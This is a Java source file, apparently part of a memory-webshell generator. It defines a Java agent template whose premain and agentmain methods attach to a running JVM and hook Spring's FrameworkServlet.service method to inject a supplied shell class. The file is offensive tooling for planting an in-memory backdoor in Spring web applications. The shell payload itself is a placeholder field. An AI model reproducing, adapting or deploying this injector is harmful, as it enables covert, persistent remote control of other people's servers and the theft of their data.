package org.leo.jmg.mem.injectortpl.springwebmvc;

import org.leo.jmg.mem.agent.AgentInjectorSupport;

import java.lang.instrument.Instrumentation;

/** service Agent 挂载模板。 */
public class SpringWebMvcFrameworkServletAgentInjector extends AgentInjectorSupport {
    private static String shellClassName;
    private static String shellClass;
    private static final String[] TARGET_CLASSES = new String[]{
            "org/springframework/web/servlet/FrameworkServlet"
    };

    public static void premain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new SpringWebMvcFrameworkServletAgentInjector());
    }

    public static void agentmain(String arguments, Instrumentation instrumentation) throws Exception {
        launch(instrumentation, new SpringWebMvcFrameworkServletAgentInjector());
    }

    @Override
    protected String[] targetClasses() { return TARGET_CLASSES; }

    @Override
    protected String targetMethodName() { return "service"; }

    @Override
    protected String shellClassName() { return shellClassName; }

    @Override
    protected String shellClassPayload() { return shellClass; }
}
